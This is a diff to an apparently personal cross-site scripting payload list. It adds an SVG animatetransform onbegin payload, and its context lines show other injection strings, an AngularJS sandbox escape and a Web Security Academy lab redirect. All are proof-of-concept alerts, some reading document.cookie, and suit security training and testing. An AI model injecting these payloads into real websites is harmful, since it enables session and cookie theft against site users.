@@ -2,6 +2,7 @@
 "><img src=1 onerror=alert(document.cookie)>
 javascript:alert(document.domain)
 "><svg onload=alert(1)>
+"><svg><animatetransform onbegin=alert(1)>
 '-alert(9)-'
 \"-alert(xss)}//
 \';alert(99);//
@@ -16,4 +17,6 @@ angular js : {{$on.constructor('alert(1)')()}}
 <script>
 location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
+
+
 https://www.vulnerability-lab.com/resources/documents/531.txt
